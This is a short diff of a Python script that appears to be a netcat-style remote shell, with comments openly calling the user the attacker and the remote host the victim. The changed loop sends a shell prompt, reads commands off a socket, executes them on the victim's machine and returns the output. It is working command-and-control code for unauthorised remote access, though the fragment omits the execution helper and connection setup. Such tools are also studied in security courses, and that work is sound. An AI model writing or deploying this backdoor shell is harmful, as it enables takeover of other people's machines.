@@ -27,19 +27,25 @@ def run_command(cmd):
 def client_handler(client_socket):
     while True:
         try:
-            # Receive the command from the server (attacker)
+            # Send a simple shell prompt to the attacker
+            client_socket.send("<Shell:#> ".encode("utf-8"))
+
+            # Receive the command from the attacker (you)
             cmd_buffer = b""
             while b"\n" not in cmd_buffer:
                 cmd_buffer += client_socket.recv(1024)
 
-            # Execute the command and send back the results
+            # Now send the command to the victim's machine and execute it
             response = run_command(cmd_buffer)
+
+            # Send the response (command output) back to the attacker
             client_socket.send(response)
 
         except Exception as e:
             print(f"[*] Exception: {e}")
             client_socket.close()
             break
+
 #let's work on incoming connections:
 def server_loop():
     global target
